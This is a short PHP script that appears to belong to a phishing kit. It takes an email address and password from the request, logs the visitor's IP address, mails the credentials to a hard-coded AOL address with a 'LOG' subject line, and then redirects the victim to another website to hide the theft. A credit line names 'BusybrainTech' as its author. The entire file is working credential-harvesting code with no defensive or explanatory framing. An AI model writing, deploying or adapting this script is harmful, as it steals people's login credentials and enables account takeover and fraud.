<?php

//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "Email: ".$_GET['email']."\n";
$message .= "Pass: ".$_GET['password']."\n";
$message .= "user ip: ".$ip. "\n"; 
$message .= "------------Created by BusybrainTech------------\n";

$to = "busybraintech@aol.com";

$hi = mail($to,"LOG | ".$ip, $message);

header ("location: https://ncm-bd.com/account/next.html")

?>